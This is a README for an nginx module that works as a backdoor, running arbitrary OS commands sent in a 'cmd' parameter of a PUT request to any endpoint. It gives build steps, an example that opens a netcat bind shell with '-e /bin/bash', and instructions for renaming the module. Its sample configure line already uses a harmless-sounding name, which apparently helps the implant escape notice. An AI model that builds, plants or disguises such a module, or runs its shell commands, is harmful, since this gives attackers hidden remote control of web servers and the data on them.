# nginx-rce-module
Module allows for command execution using PUT requests to any endpoint on an nginx server


## Install
1. Download nginx source (ex `wget https://nginx.org/download/nginx-1.25.3.tar.gz`)
2. Install Dependencies: (ex `sudo apt install build-essential libpcre3-dev zlib1g-dev libz-dev libssl-dev libpcre3-dev wget tar`)
3. Add ngx_http_mycmd_module folder to nginx/src/http/modules/
4. Run configure with the additional flag `--add-module=src/http/modules/ngx_http_mycmd_module`
   Example Configure: `./configure --prefix=/opt/nginx --conf-path=/etc/nginx/nginx.conf --pid-path=/opt/nginx/logs/nginx.pid --with-http_ssl_module --add-module=src/http/modules/ngx_http_sslconf_module`   
5. Make and Make Install `make -j$(nproc) && make install`
6. Setup nginx server


## Use
After the server is setup, the module can be utilized with a PUT request including the cmd parameter.
Example:

`curl -X PUT http://localhost/?cmd=/usr/bin/touch%20/tmp/testfile`

`curl -X PUT http://localhost/?cmd=nohup%20nc%20-lvnp%208080%20-e%20/bin/bash`


### Renaming Module
If you want to rename the module from "mycmd", just rename the folder, .c file names to remote mycmd and add your new module, also change all references to "mycmd" in both files to "newname".

#### Example
  - ngx_http_mycmd_module/ -> ngx_http_urcmd_module/
  - ngx_http_mycmd_module.c -> ngx_http_urcmd_module.c
  - etc.
